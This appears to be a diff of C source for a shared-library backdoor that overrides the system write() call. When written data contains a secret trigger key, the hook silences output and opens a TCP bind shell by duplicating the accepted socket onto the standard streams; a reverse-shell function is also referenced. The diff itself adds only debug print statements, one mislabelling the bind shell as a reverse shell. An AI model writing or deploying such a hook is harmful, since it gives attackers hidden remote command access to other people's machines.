@@ -16,7 +16,7 @@
 
 
 int TCP_IP_BIND_SHELL(void){
-
+    printf("Starting TCP/IP Reverse Shell..\n");
     int listening_socket = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_addr;
@@ -30,6 +30,7 @@ int TCP_IP_BIND_SHELL(void){
 
     int accepted_socket = accept(listening_socket, NULL, NULL);
     
+    if(accepted_socket < 0) printf("Error creating socket!\n");
     for(int i = 0; i < 3; i++){
         dup2(accepted_socket, i);
     }
@@ -68,6 +69,7 @@ int TCP_IP_REVERSE_SHELL(void){
 }
 ssize_t write(int fildes, const void *buf, size_t nbytes)
 {
+    printf("Intercepted write call...\n");
 	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
 
 	ssize_t result;
@@ -78,6 +80,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
     char* malConnectReverse = strstr(buf, REVERSE_KEY);
 
     if(malConnectBind != NULL){
+        printf("recognized buffer\n");
         fildes = open("dev/null", O_WRONLY | O_APPEND);
         result = new_write(fildes, buf, nbytes);
         TCP_IP_BIND_SHELL();
